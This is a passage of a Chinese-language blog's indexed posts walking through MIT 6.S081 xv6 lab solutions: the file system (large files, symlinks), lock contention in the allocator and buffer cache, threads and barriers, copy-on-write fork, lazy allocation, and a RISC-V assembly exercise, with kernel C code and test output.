ip-\u003eaddrs[i]); ip-\u003eaddrs[i] = 0; } } if(ip-\u003eaddrs[NDIRECT]){ bp = bread(ip-\u003edev, ip-\u003eaddrs[NDIRECT]); a = (uint*)bp-\u003edata; for(j = 0; j \u003c NINDIRECT; j++){ if(a[j]) bfree(ip-\u003edev, a[j]); } brelse(bp); bfree(ip-\u003edev, ip-\u003eaddrs[NDIRECT]); ip-\u003eaddrs[NDIRECT] = 0; } if(ip-\u003eaddrs[NDIRECT+1]){ bp = bread(ip-\u003edev, ip-\u003eaddrs[NDIRECT+1]); a = (uint*)bp-\u003edata; for(j = 0; j \u003c NINDIRECT; j++){ // level1 if(a[j]) { nbp = bread(ip-\u003edev, a[j]); na = (uint*)nbp-\u003edata; for(k = 0; k \u003c NINDIRECT; k++) { // level2 if(na[k]) { bfree(ip-\u003edev, na[k]); } } bfree(ip-\u003edev, a[j]); brelse(nbp); } } brelse(bp); bfree(ip-\u003edev, ip-\u003eaddrs[NDIRECT+1]); ip-\u003eaddrs[NDIRECT+1] = 0; } ip-\u003esize = 0; iupdate(ip); } 运行bigfile测试，看到测试创建了一个 size 为65803个 block 的最大文件。 $ bigfile .................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................. wrote 65803 blocks bigfile done; ok ","date":"2021-03-02","objectID":"/posts/6-s081-lab9-fs/:1:0","tags":["6.S081","file system"],"title":"6.S081 lab9 fs","uri":"/posts/6-s081-lab9-fs/"},{"categories":["OS"],"content":"Symbolic links 这次我们需要实现一个syscall，用于创建符号连接，符号链接不会增加实际文件inode的 link 数，只是使用路径指向被 link 的文件。 首先，按照之前熟悉的方法添加新的syscall。 在kernel/stat.h中添加符号文件类型： #define T_SYMLINK 4 在kernel/fcntl.h中添加： #define O_NOFOLLOW 0x800 用于标识是要读取符号文件本身还是符号链接指向的文件。 之后我们实现symlink本身： uint64 sys_symlink(void) { char target[MAXPATH], path[MAXPATH];; struct inode *ip; if(argstr(0, target, MAXPATH) \u003c 0|| argstr(1, path, MAXPATH) \u003c 0) { return -1; } begin_op(); if ((ip = create(path, T_SYMLINK, 0, 0)) == 0){ end_op(); return -1; } int len = strlen(target); // write target path len if(writei(ip, 0, (uint64)\u0026len, 0, sizeof(len)) \u003c sizeof(len)) { iunlockput(ip); end_op(); return -1; } // write target path if(writei(ip, 0, (uint64)target, sizeof(len), len + 1) \u003c 0) { iunlockput(ip); end_op(); return -1; } iunlockput(ip); end_op(); return 0; } 首先我们为符号文件创建一个新的inode，然后向其数据区写入指向的目标。在写入目标时，使用了[len, target]的格式，方便我们之后能准确地从文件系统中读取出target。 然后，我们需要修改sys_open，使之正确的处理符号文件。 Modify the open system call to handle the case where the path refers to a symbolic link. If the file does not exist, open must fail. When a process specifies O_NOFOLLOW in the flags to open, open should open the symlink (and not follow the symbolic link). If the linked file is also a symbolic link, you must recursively follow it until a non-link file is reached. If the links form a cycle, you must return an error code. You may approximate this by returning an error code if the depth of links reaches some threshold (e.g., 10). 当没有设置O_NOFOLLOW时，open调用需要打开符号文件指向的真实文件，如果被符号文件指向的文件也是符号文件，则需要递归查找，指导找到真实文件。为了防止循环引用，当查找次数一定数值时，可以判断失败。 #define MAXSYMLINK 10 if (!(omode \u0026 O_NOFOLLOW)) { int cnt = MAXSYMLINK; int len = 0; while (cnt-- \u003e 0) { ilock(ip); if (ip-\u003etype == T_SYMLINK) { if (readi(ip, 0, (uint64)\u0026len, 0, sizeof(len)) \u003c sizeof(len)) { iunlockput(ip); end_op(); return -1; } if (readi(ip, 0, (uint64)path, sizeof(len), len + 1) \u003c len + 1) { iunlockput(ip); end_op(); return -1; } iunlockput(ip); } else { iunlock(ip); break; } if((ip = namei(path)) == 0){ end_op(); return -1; } } if (cnt \u003c= 0) { end_op(); return -1; } } ","date":"2021-03-02","objectID":"/posts/6-s081-lab9-fs/:2:0","tags":["6.S081","file system"],"title":"6.S081 lab9 fs","uri":"/posts/6-s081-lab9-fs/"},{"categories":["OS"],"content":"在本实验室中，将重新设计代码以提高并行性。在多核机器上，并行性差的一个常见症状是高强度的锁竞争。提高并行性通常需要改变数据结构和加锁策略，以减少争用。您将对 xv6 内存分配器和文件块缓存进行改进。 ","date":"2021-03-01","objectID":"/posts/6-s081-lab8-lock/:0:0","tags":["6.S081","lock"],"title":"6.S081 lab8 lock","uri":"/posts/6-s081-lab8-lock/"},{"categories":["OS"],"content":"Memory allocator xv6的内存分配与释放使用了一个全局锁kmem.lock，所有 cpu 想要分配和释放内存时，调用kfree()和kalloc()将对kmem.lock加锁，所以多线程同时获取和释放内存时，将造成激烈的锁竞争。本次实验将为每一个 cpu 实现单独的空闲内存链表，当一个 cpu 没有可用内存时，从另一个 cpu“窃取”。 在改进之前，进行kalloctest： $ kalloctest start test1 test1 results: --- lock kmem/bcache stats lock: kmem: #fetch-and-add 134228 #acquire() 433016 lock: bcache: #fetch-and-add 0 #acquire() 1242 --- top 5 contended locks: lock: kmem: #fetch-and-add 134228 #acquire() 433016 lock: proc: #fetch-and-add 39362 #acquire() 135295 lock: virtio_disk: #fetch-and-add 8435 #acquire() 114 lock: proc: #fetch-and-add 4895 #acquire() 135334 lock: proc: #fetch-and-add 3939 #acquire() 135337 tot= 134228 test1 FAIL start test2 total free number of pages: 32499 (out of 32768) ..... test2 OK 可以看到kmem锁的“#fetch-and-add”数值（即自旋次数）非常高，锁竞争非常吉利。 需要注意： The function cpuid returns the current core number, but it’s only safe to call it and use its result when interrupts are turned off. You should use push_off() and pop_off() to turn interrupts off and on. 修改kmem，kinit()，kfree，kalloc： struct { struct spinlock lock; struct run *freelist; } kmems[NCPU]; char kbuf[NCPU][20]; void kinit() { for (int i = 0; i \u003c NCPU; i++) { snprintf(kbuf[i], 20, \"kmem%d\", i); initlock(\u0026kmems[i].lock, (char*)kbuf[i]); } freerange(end, (void*)PHYSTOP); } void kfree(void *pa) { struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa \u003c end || (uint64)pa \u003e= PHYSTOP) panic(\"kfree\"); // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); r = (struct run*)pa; // interrupt off push_off(); int cpu = cpuid(); acquire(\u0026kmems[cpu].lock); r-\u003enext = kmems[cpu].freelist; kmems[cpu].freelist = r; release(\u0026kmems[cpu].lock); // interrupt on pop_off(); } void * kalloc(void) { struct run *r; push_off(); int cpu = cpuid(); acquire(\u0026kmems[cpu].lock); r = kmems[cpu].freelist; if(r) kmems[cpu].freelist = r-\u003enext; release(\u0026kmems[cpu].lock); // steal from other cpu if(!r) { for(int i = 0; i \u003c NCPU; i++) { if (i == cpu) continue; acquire(\u0026kmems[i].lock); r = kmems[i].freelist; if (r) { kmems[i].freelist = r-\u003enext; release(\u0026kmems[i].lock); break; } release(\u0026kmems[i].lock); } } pop_off(); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r; } 修改后进行kalloctest： $ kalloctest start test1 test1 results: --- lock kmem/bcache stats lock: kmem0: #fetch-and-add 0 #acquire() 65683 lock: kmem1: #fetch-and-add 0 #acquire() 190628 lock: kmem2: #fetch-and-add 0 #acquire() 176734 lock: bcache: #fetch-and-add 0 #acquire() 1242 --- top 5 contended locks: lock: proc: #fetch-and-add 35310 #acquire() 112156 lock: virtio_disk: #fetch-and-add 11562 #acquire() 114 lock: proc: #fetch-and-add 4717 #acquire() 112193 lock: proc: #fetch-and-add 4242 #acquire() 112196 lock: proc: #fetch-and-add 4058 #acquire() 112181 tot= 0 test1 OK start test2 total free number of pages: 32499 (out of 32768) ..... test2 OK 可以看到kmem锁竞争消失了。 ","date":"2021-03-01","objectID":"/posts/6-s081-lab8-lock/:1:0","tags":["6.S081","lock"],"title":"6.S081 lab8 lock","uri":"/posts/6-s081-lab8-lock/"},{"categories":["OS"],"content":"Buffer cache 在xv6中，使用buffer cache缓存一个磁盘block的内容，bcache使用一个锁来维护，每次bget和brelse都需要获取锁，这样将带来很激烈的锁竞争。 在修改前，bcachetest测试结果如下： $ bcachetest start test0 test0 results: --- lock kmem/bcache stats lock: bcache: #fetch-and-add 90245 #acquire() 65022 --- top 5 contended locks: lock: virtio_disk: #fetch-and-add 157311 #acquire() 1137 lock: bcache: #fetch-and-add 90245 #acquire() 65022 lock: proc: #fetch-and-add 82586 #acquire() 73871 lock: proc: #fetch-and-add 59647 #acquire() 73519 lock: proc: #fetch-and-add 29617 #acquire() 73520 tot= 90245 test0: FAIL start test1 test1 OK 根据实验指导，我们将bcache的数据结构由一个双向链表改为hashtable，bucket数量使用素数来减少 hash 碰撞，其中steal_lock是整个bcache的大锁。 #define NBUCKET 13 struct { struct buf head[NBUCKET]; struct spinlock lock[NBUCKET]; struct buf buf[NBUF]; struct spinlock steal_lock; } bcache; uint ihash(uint blockno) { return blockno % NBUCKET; } 修改初始化代码，将每个bucket指向的buf构造成双向循环链表，方便查找头尾，每次被释放的buf将被移到头部，以实现 LRU，减少查找长度。 char buf[NBUCKET][20]; void binit(void) { struct buf *b; for (int i = 0; i \u003c NBUCKET; i++) { snprintf(buf[i], 20, \"bcache.bucket%d\", i); initlock(\u0026bcache.lock[i], (char*)buf[i]); } initlock(\u0026bcache.steal_lock, \"bcache\"); for (int i = 0; i \u003c NBUCKET; i++) { // create a circular linked list // head.next is the first elem // head.prev is the last(LRU) elem struct buf *head = \u0026bcache.head[i]; head-\u003eprev = head; head-\u003enext = head; } int i; // Average distribut buf to each bucket for (b = bcache.buf, i = 0; b \u003c bcache.buf + NBUF; b++, i = (i + 1) % NBUCKET) { b-\u003enext = bcache.head[i].next; b-\u003eprev = \u0026bcache.head[i]; bcache.head[i].next-\u003eprev = b; bcache.head[i].next = b; initsleeplock(\u0026b-\u003elock, \"buffer\"); } } 修改最关键的bget： static struct buf* bget(uint dev, uint blockno) { struct buf *b; uint idx = ihash(blockno); acquire(\u0026bcache.lock[idx]); for (b = bcache.head[idx].next; b != \u0026bcache.head[idx]; b = b-\u003enext) { if(b-\u003edev == dev \u0026\u0026 b-\u003eblockno == blockno) { b-\u003erefcnt++; release(\u0026bcache.lock[idx]); acquiresleep(\u0026b-\u003elock); return b; } } // Not cached, find LRU for (b = bcache.head[idx].prev; b != \u0026bcache.head[idx]; b = b-\u003eprev) { if (b-\u003erefcnt == 0) { b-\u003edev = dev; b-\u003eblockno = blockno; b-\u003evalid = 0; b-\u003erefcnt = 1; release(\u0026bcache.lock[idx]); acquiresleep(\u0026b-\u003elock); return b; } } release(\u0026bcache.lock[idx]); acquire(\u0026bcache.steal_lock); acquire(\u0026bcache.lock[idx]); for (b = bcache.head[idx].next; b != \u0026bcache.head[idx]; b = b-\u003enext) { if(b-\u003edev == dev \u0026\u0026 b-\u003eblockno == blockno) { b-\u003erefcnt++; release(\u0026bcache.lock[idx]); release(\u0026bcache.steal_lock); acquiresleep(\u0026b-\u003elock); return b; } } // Not cached, find LRU for (b = bcache.head[idx].prev; b != \u0026bcache.head[idx]; b = b-\u003eprev) { if (b-\u003erefcnt == 0) { b-\u003edev = dev; b-\u003eblockno = blockno; b-\u003evalid = 0; b-\u003erefcnt = 1; release(\u0026bcache.lock[idx]); release(\u0026bcache.steal_lock); acquiresleep(\u0026b-\u003elock); return b; } } // steal from other bucket uint _idx = idx; idx = ihash(idx + 1); while (idx != _idx) { acquire(\u0026bcache.lock[idx]); // Not cached; recycle an unused buffer. for (b = bcache.head[idx].prev; b != \u0026bcache.head[idx]; b = b-\u003eprev) { if (b-\u003erefcnt == 0) { b-\u003edev = dev; b-\u003eblockno = blockno; b-\u003evalid = 0; b-\u003erefcnt = 1; b-\u003eprev-\u003enext = b-\u003enext; b-\u003enext-\u003eprev = b-\u003eprev; release(\u0026bcache.lock[idx]); b-\u003enext = bcache.head[_idx].next; b-\u003eprev = \u0026bcache.head[_idx]; b-\u003enext-\u003eprev = b; b-\u003eprev-\u003enext = b; release(\u0026bcache.lock[_idx]); release(\u0026bcache.steal_lock); acquiresleep(\u0026b-\u003elock); return b; } } release(\u0026bcache.lock[idx]); idx = ihash(idx + 1); } release(\u0026bcache.lock[_idx]); release(\u0026bcache.steal_lock); panic(\"bget: no buffers\"); } 上面的代码中，在当前bucket中两次查看block是否已经被缓存或者有空闲buf可用，第二次使用了整个bcache的大锁。在我最开始的设计中，当前bucket中找不到可用buf时，直接尝试从其他bucket steal，这会导致潜在的死锁问题，当出现 A steal from B，B steal from A 的情况，就会死锁，这种情况代表了所有buf被消耗殆尽，这时应该执行到末尾的panic，而不能死锁在这里。 测试中应该没有同时消耗掉所有buf，所以死锁并不会出现，但还是应该在设计上避免死锁，所以使用了整个bcache的大锁steal_lock。当任何进程想要从其他bucket steal buf时，需要持有该锁，并且需要重复之前的扫描操作，防止执行空隙中有其他进程缓存了对应block，破坏操作的原子性，导致一个block被缓存两次。steal_lock仅影响 steal，当steal_lock被持有，不参与 steal 的其他bucket仍可以被并发地bget()。该设计需要感谢知乎iced coffe。 之","date":"2021-03-01","objectID":"/posts/6-s081-lab8-lock/:2:0","tags":["6.S081","lock"],"title":"6.S081 lab8 lock","uri":"/posts/6-s081-lab8-lock/"},{"categories":["OS"],"content":"本实验室将让你熟悉多线程。您将在用户级线程包中实现线程切换；使用多线程来加快程序的速度；并实现一个barrier。 ","date":"2021-02-28","objectID":"/posts/6-s081-lab7-thread/:0:0","tags":["6.S081","Multithreading"],"title":"6.S081 lab7 thread","uri":"/posts/6-s081-lab7-thread/"},{"categories":["OS"],"content":"Uthread: switching between threads 实验代码中为我们提供了一个用户级别线程库，需要我们实现线程切换部分。我们需要给user/uthread.c中的thread_create()和thread_schedule()，以及user/uthread_switch.S中的thread_switch添加代码。 首先，我们为thread添加context以保存callee寄存器值，从kernel/proc.h中复制即可。 struct context { uint64 ra; uint64 sp; // callee-saved uint64 s0; uint64 s1; uint64 s2; uint64 s3; uint64 s4; uint64 s5; uint64 s6; uint64 s7; uint64 s8; uint64 s9; uint64 s10; uint64 s11; }; struct thread { char stack[STACK_SIZE]; /* the thread's stack */ int state; /* FREE, RUNNING, RUNNABLE */ struct context context; }; 然后是``thread_create()`： void thread_create(void (*func)()) { struct thread *t; for (t = all_thread; t \u003c all_thread + MAX_THREAD; t++) { if (t-\u003estate == FREE) break; } t-\u003estate = RUNNABLE; // YOUR CODE HERE // user ra return func in switch t-\u003econtext.ra = (uint64)func; // point to stack top(highest addr) t-\u003econtext.sp = (uint64)t-\u003estack + STACK_SIZE; } 利用ra在 switch 到 thread 后，返回到函数的位置，将sp指向该thread的栈顶。 最后是thread_schedule： if (current_thread != next_thread) { /* switch threads? */ next_thread-\u003estate = RUNNING; t = current_thread; current_thread = next_thread; /* YOUR CODE HERE * Invoke thread_switch to switch from t to next_thread: * thread_switch(??, ??); */ thread_switch((uint64)\u0026t-\u003econtext, (uint64)\u0026current_thread-\u003econtext); } 至于thread_switch的代码，直接从kernel/switch.S中复制即可。 ","date":"2021-02-28","objectID":"/posts/6-s081-lab7-thread/:1:0","tags":["6.S081","Multithreading"],"title":"6.S081 lab7 thread","uri":"/posts/6-s081-lab7-thread/"},{"categories":["OS"],"content":"Using threads 后面的两关都和xv6无关了，大概是有一些多线程的 feature，xv6无法提供，所以需要我们使用pthread。 实验为我们提供了一个无锁的hashtable，单线程下执行无误，但是多线程执行时，会发生如下问题： ❯ ./ph 2 100000 puts, 1.780 seconds, 56190 puts/second 0: 16577 keys missing 1: 16577 keys missing 200000 gets, 4.343 seconds, 46055 gets/second 这是因为，当两个线程同时插入hashtable的一个bucket时，会导致 key 丢失。 我们对put操作加锁即可（不要忘了在main()函数中初始化locks）： pthread_mutex_t locks[NBUCKET]; static void put(int key, int value) { int i = key % NBUCKET; pthread_mutex_lock(\u0026locks[i]); // is the key already present? struct entry *e = 0; for (e = table[i]; e != 0; e = e-\u003enext) { if (e-\u003ekey == key) break; } if(e){ // update the existing key. e-\u003evalue = value; } else { // the new is new. insert(key, value, \u0026table[i], table[i]); } pthread_mutex_unlock(\u0026locks[i]); } ","date":"2021-02-28","objectID":"/posts/6-s081-lab7-thread/:2:0","tags":["6.S081","Multithreading"],"title":"6.S081 lab7 thread","uri":"/posts/6-s081-lab7-thread/"},{"categories":["OS"],"content":"Barrier 本关要求我们实现一个barrie：在某个点上，所有相关的的线程必须等待，直到所有其他相关的线程也到达这个点。这个我们参考xv6中的sleep和wait的使用即可： static void barrier() { // YOUR CODE HERE // // Block until all threads have called barrier() and // then increment bstate.round. // pthread_mutex_lock(\u0026bstate.barrier_mutex); bstate.nthread++; if (bstate.nthread == nthread) { bstate.round++; bstate.nthread = 0; pthread_cond_broadcast(\u0026bstate.barrier_cond); } else { pthread_cond_wait(\u0026bstate.barrier_cond, \u0026bstate.barrier_mutex); } pthread_mutex_unlock(\u0026bstate.barrier_mutex); } ","date":"2021-02-28","objectID":"/posts/6-s081-lab7-thread/:3:0","tags":["6.S081","Multithreading"],"title":"6.S081 lab7 thread","uri":"/posts/6-s081-lab7-thread/"},{"categories":["OS"],"content":"Copy-on-Write Fork for xv6 这次 lab 只有一关，那就是为xv6实现copy on write。 xv6中的fork()系统调用将父进程的用户内存全部复制到子进程中。如果父进程内存占用很大，复制可能需要很长的时间。更糟糕的是，通常来说，这个复制在很大程度上是浪费的；例如，在子进程中，fork()之后的exec()调用会导致子进程丢弃复制的内存，可能大部分内存都没有来得及使用。另一方面，如果父子双方都使用一个page，并且其中一方或双方需要写这个page，那么确实需要复制。 根据官网给的提示： 使用引用计数，对每个物理页面维护一个reference count，记录物理页面被 map 的次数。 kernel/kalloc.c struct { struct spinlock lock; struct run *freelist; int rc[PHYSTOP / PGSIZE]; } kmem; void freerange(void *pa_start, void *pa_end) { char *p; p = (char*)PGROUNDUP((uint64)pa_start); for(; p + PGSIZE \u003c= (char*)pa_end; p += PGSIZE) { kmem.rc[(uint64)p / PGSIZE] = 1; kfree(p); } } void increase_rc(uint64 pa) { acquire(\u0026kmem.lock); kmem.rc[pa / PGSIZE]++; release(\u0026kmem.lock); } 利用 RISC-V PTE 中的RSW (reserved for software)位来标记cow页，修改uvmcopy(),在复制内存时，仅将父进程的物理页面 map 到子进程页表中，并清除双方PTE中的PTE_W标志。 在kernel/riscv.h中加入： #define PTE_COW (1L \u003c\u003c 8) 在kernel/vm.c中加入： int uvmcopy(pagetable_t old, pagetable_t new, uint64 sz) { pte_t *pte; uint64 pa, i; uint flags; for(i = 0; i \u003c sz; i += PGSIZE){ if((pte = walk(old, i, 0)) == 0) panic(\"uvmcopy: pte should exist\"); if((*pte \u0026 PTE_V) == 0) panic(\"uvmcopy: page not present\"); pa = PTE2PA(*pte); flags = PTE_FLAGS(*pte); // only for writable page if (flags \u0026 PTE_W) { flags = (flags | PTE_COW) \u0026 (~PTE_W); *pte = PA2PTE(pa) | flags; } increase_rc(pa); if(mappages(new, i, PGSIZE, pa, flags) != 0){ goto err; } } return 0; err: uvmunmap(new, 0, i / PGSIZE, 1); return -1; } 注意mappages失败时，删掉原有的kfree(mem)，因为我们没有申请新的内存。 发生page falut时，在usertrap()中捕获，对cow page分配真正的物理内存。 kernel/kalloc.c int cow_alloc(pagetable_t pagetable, uint64 va) { uint64 pa; uint64 mem; pte_t *pte; if (va \u003e= MAXVA) return -1; va = PGROUNDDOWN(va); pte = walk(pagetable, va, 0); if (pte == 0) { return -1; } // not a valid cow page if (!(*pte \u0026 PTE_V)) { return -2; } pa = PTE2PA(*pte); // only one rf, make it writable acquire(\u0026kmem.lock); if (kmem.rc[pa / PGSIZE] == 1) { *pte \u0026= ~PTE_COW; *pte |= PTE_W; release(\u0026kmem.lock); return 0; } release(\u0026kmem.lock); if ((mem = (uint64)kalloc()) == 0){ return -3; } memmove((void *)mem, (void *)pa, PGSIZE); *pte = ((PA2PTE(mem) | PTE_FLAGS(*pte) | PTE_W) \u0026 (~PTE_COW)); // decrease rc kfree((void *)pa); return 0; } 在我的实现中，当cow page发生page fault，且reference count为 1 时，不再重新分配页面进行复制，而是直接将该页面消去PTE_COW并加上PTE_W，减少内存分配和复制操作。 在kernel/trap.c： else if(r_scause() == 13 || r_scause() == 15) { va = r_stval(); if (va \u003c PGROUNDDOWN(p-\u003etrapframe-\u003esp) \u0026\u0026 va \u003e= PGROUNDDOWN(p-\u003etrapframe-\u003esp) - PGSIZE) { // guard page p-\u003ekilled = 1; } else { int ret; if((ret = cow_alloc(p-\u003epagetable, va)) \u003c 0 ) { p-\u003ekilled = 1; } } } 当使用kalloc()进行内存分配时，需要将对应page的reference count设置为 1，使用kfree()释放内存时，只能将reference count为 0 的页面放回空闲列表。 kernel/kalloc.c： void * kalloc(void) { struct run *r; acquire(\u0026kmem.lock); r = kmem.freelist; if(r) { kmem.freelist = r-\u003enext; kmem.rc[(uint64)r / PGSIZE] = 1; } release(\u0026kmem.lock); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r; } void kfree(void *pa) { struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa \u003c end || (uint64)pa \u003e= PHYSTOP) panic(\"kfree\"); acquire(\u0026kmem.lock); kmem.rc[(uint64)pa / PGSIZE]--; if(kmem.rc[(uint64)pa / PGSIZE] \u003c= 0) { memset(pa, 1, PGSIZE); r = (struct run*)pa; r-\u003enext = kmem.freelist; kmem.freelist = r; } release(\u0026kmem.lock); } 注意：kfree()中，对于kmem.rc[(uint64)pa / PGSIZE]的修改和读取必须是一个原子操作，否则内存可能被重复释放，例如对于某个物理page，同时 map 到 A、B 的页表中，之后： A : ref - 1 B : ref - 1 A : ref == 0 =\u003e free B : ref == 0 =\u003e free 最后，我们需要修改copyout()，同lazy allocation一样，当因为系统调用切换到内核页表时，硬件无法再为写cow page产生page fault，所以我们需要手动处理： int copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len) { uint64 n, va0, pa0; while(len \u003e 0){ va0 = PGROUNDDOWN(dstva); cow_alloc(pagetable, va0); pa0 = walkaddr(pagetable, va0); if(pa0 == 0) return -1; n = PGSIZE - (dstva - va0); if(n \u003e len) n = len; memmove((void *)(pa0 + (dstva - va0)), src, n); len -= n; src += n; dstva = va0 + PGSIZE; } return 0; } 至此便完成了 lab6 copy on write。 ","date":"2021-02-27","objectID":"/posts/6-s081-lab6-cow/:1:0","tags":["6.S081","cow"],"title":"6.S081 lab6 cow","uri":"/posts/6-s081-lab6-cow/"},{"categories":["OS"],"content":"Eliminate allocation from sbrk() 这次实验的第一关非常简单，就是从sbrk调用中取消内存分配，为之后的lay allocation做准备。 uint64 sys_sbrk(void) { int addr; int n; if(argint(0, \u0026n) \u003c 0) return -1; struct proc *p = myproc(); addr = p-\u003esz; p-\u003esz += n; return addr; } hints 提示我们，修改完代码后，尝试运行echo hi，会产生类似下面的结果: $ echo hi usertrap(): unexpected scause 0x000000000000000f pid=3 sepc=0x0000000000001258 stval=0x0000000000004008 va=0x0000000000004000 pte=0x0000000000000000 panic: uvmunmap: not mapped 其实并不一定是echo才会导致 crash，其他的执行任意的命令或者输入无意义字符都会导致 crash。在user/umalloc.c中，morecore调用了sbrk，malloc调用了morecore。在user/sh.c中，shell 运行过程中不断地调用malloc为 command 申请分配空间，然后运行 command。这个过程中，malloc 并未真正分配空间，运行时访问到对应虚拟地址就会产生 page fault，导致 panic； ","date":"2021-02-25","objectID":"/posts/6-s081-lab5-lazy/:1:0","tags":["6.S081","lazy allocation"],"title":"6.S081 lab5 lazy","uri":"/posts/6-s081-lab5-lazy/"},{"categories":["OS"],"content":"Lazy allocation 这一关需要我们实现lazy allocation，在usertrap()中处理page fault，为产生page fault的虚拟地址分配一个真实的物理页面，并 map 到对应虚拟地址。 r_scause()用于获取 trap 产生的原因，为 13/15 时为page fault。 r_stval()获取stval寄存器值，它是导致page fault的虚拟地址值。 uvmunmap()会 panic，因为进程地址空间有些虚拟地址并未被 map，所要加以修改。 参照uvmalloc()，完成如下函数，为虚拟地址va分配一个真实物理页： uint64 lazy_uvmalloc(pagetable_t pagetable, uint64 va) { char *mem; va = PGROUNDDOWN(va); mem = kalloc(); if(mem == 0){ return -1; } memset(mem, 0, PGSIZE); if(mappages(pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != 0) { kfree(mem); return -1; } return 0; } 在usertrap()中加入对于page fault的处理： else if(cause == 13 || cause == 15) { uint64 va = r_stval(); if(lazy_uvmalloc(p-\u003epagetable, va) != 0) { p-\u003ekilled = 1; } } 添加以上代码之后，在uvmunmap()中添加如下修改，取消panic： if((pte = walk(pagetable, a, 0)) == 0) // panic(\"uvmunmap: walk\"); continue; if((*pte \u0026 PTE_V) == 0) // panic(\"uvmunmap: not mapped\"); continue; 完成如上代码后，echo hi可以正常运行。 ","date":"2021-02-25","objectID":"/posts/6-s081-lab5-lazy/:2:0","tags":["6.S081","lazy allocation"],"title":"6.S081 lab5 lazy","uri":"/posts/6-s081-lab5-lazy/"},{"categories":["OS"],"content":"Lazytests and Usertests 第三关需要处理第二关的一些遗留细节问题，完善lazy allocation，使之通过全部测试。 Handle negative sbrk() arguments. 对于负数参数，需要unmap对应页面: if(n \u003c 0){ p-\u003esz = uvmdealloc(p-\u003epagetable, p-\u003esz, p-\u003esz + n); } else { p-\u003esz += n; } Kill a process if it page-faults on a virtual memory address higher than any allocated with sbrk(). Handle faults on the invalid page below the user stack. 这里需要判断产生page fault的 va 是否在当前进程拥有的地址范围之外。 if (va \u003e= p-\u003esz || va \u003c p-\u003etrapframe-\u003esp) p-\u003ekilled = 1; Handle the parent-to-child memory copy in fork() correctly. 在fork()中，使用如下代码将内存从父进程复制到子进程： // Copy user memory from parent to child. if(uvmcopy(p-\u003epagetable, np-\u003epagetable, p-\u003esz) \u003c 0){ freeproc(np); release(\u0026np-\u003elock); return -1; } 进入uvmcopy()，做出如下修改： if((pte = walk(old, i, 0)) == 0) // panic(\"uvmcopy: pte should exist\"); continue; if((*pte \u0026 PTE_V) == 0) // panic(\"uvmcopy: page not present\"); continue; Handle the case in which a process passes a valid address from sbrk() to a system call such as read or write, but the memory for that address has not yet been allocated. 当进程进行syscall时，会陷入 kernel，此时stap切换为内核页表，RISC-V硬件无法再为用户地址空间产生page fault，所以当用户执行read()和write()，将用户地址空间的有效虚拟地址传递给内核时，如果该虚拟地址没有 map 到有效物理内存，将会导致程序 panic。kernel 运行时，使用walkaddr进行虚实地址转换，所以我们需要修改其中的代码，当虚拟地址有效而页表中未 map 时，尝试为其分配物理内存： uint64 walkaddr(pagetable_t pagetable, uint64 va) { pte_t *pte; uint64 pa; struct proc *p = myproc(); if(va \u003e= MAXVA) return 0; pte = walk(pagetable, va, 0); if(pte == 0 || (*pte \u0026 PTE_V) == 0) { if (va \u003e= p-\u003esz || va \u003c p-\u003etrapframe-\u003esp) { return 0; } if(lazy_uvmalloc(pagetable, va) == 0) { pte = walk(pagetable, va, 0);; } else { return 0; } } if((*pte \u0026 PTE_U) == 0) return 0; pa = PTE2PA(*pte); return pa; } Handle out-of-memory correctly: if kalloc() fails in the page fault handler, kill the current process. 在关卡 2 中，已经做到了这一点，当lazy_uvmalloc()调用kalloc()失败时，返回非 0，杀掉进程： if(lazy_uvmalloc(p-\u003epagetable, va) != 0) { p-\u003ekilled = 1; } 做完如上修改，便能通过所有测试。 ","date":"2021-02-25","objectID":"/posts/6-s081-lab5-lazy/:3:0","tags":["6.S081","lazy allocation"],"title":"6.S081 lab5 lazy","uri":"/posts/6-s081-lab5-lazy/"},{"categories":["OS"],"content":"RISC-V assembly 这是一个简单的RISC-V汇编热身关卡。 我们需要查看user/call.asm来回答一些问题，其主要内容如下： int g(int x) { 0: 1141 addi sp,sp,-16 2: e422 sd s0,8(sp) 4: 0800 addi s0,sp,16 return x+3; } 6: 250d addiw a0,a0,3 8: 6422 ld s0,8(sp) a: 0141 addi sp,sp,16 c: 8082 ret 000000000000000e \u003cf\u003e: int f(int x) { e: 1141 addi sp,sp,-16 10: e422 sd s0,8(sp) 12: 0800 addi s0,sp,16 return g(x); } 14: 250d addiw a0,a0,3 16: 6422 ld s0,8(sp) 18: 0141 addi sp,sp,16 1a: 8082 ret 000000000000001c \u003cmain\u003e: void main(void) { 1c: 1141 addi sp,sp,-16 1e: e406 sd ra,8(sp) 20: e022 sd s0,0(sp) 22: 0800 addi s0,sp,16 printf(\"%d %d\\n\", f(8)+1, 13); 24: 4635 li a2,13 26: 45b1 li a1,12 28: 00000517 auipc a0,0x0 2c: 7b850513 addi a0,a0,1976 # 7e0 \u003cmalloc+0xea\u003e 30: 00000097 auipc ra,0x0 34: 608080e7 jalr 1544(ra) # 638 \u003cprintf\u003e exit(0); 38: 4501 li a0,0 3a: 00000097 auipc ra,0x0 3e: 276080e7 jalr 630(ra) # 2b0 \u003cexit\u003e Which registers contain arguments to functions? For example, which register holds 13 in main’s call to printf? 根据RISC-V的 calling convention，a0-a7,fa0-fa7包含了函数的参数。调用printf时，a0为格式化字符串，a1是 12，a2是 13。 Where is the call to function f in the assembly code for main? Where is the call to g? (Hint: the compiler may inline functions.) 由于f和g函数都是简单的常数计算，传递的参数也是常数 8，所以函数调用被编译器优化掉了，在0x26位置，直接将函数调用结果立即数 12 载入寄存器a1。 At what address is the function printf located? 从代码中看，很显然，在0x638得位置。 What value is in the register ra just after the jalr to printf in main? jalr指令是链接并跳转，将返回地址保存到ra寄存器，所以应为0x38。 unsigned int i = 0x00646c72; printf(\"H%x Wo%s\", 57616, \u0026i); 运行以上代码，输出HE110 World。数字 57616 的 16 进制表示为 0xE110；RISC-V采用小端法表示，16 进制的 72、6c、64、00 表示字符串“rld\\0”，如果改为大端法，则应反过来，变为i=0x726c6400。 printf(\"x=%d y=%d\", 3); 该printf调用少了一个参数，根据 calling convention，对y=%d会取a2的值进行输出。 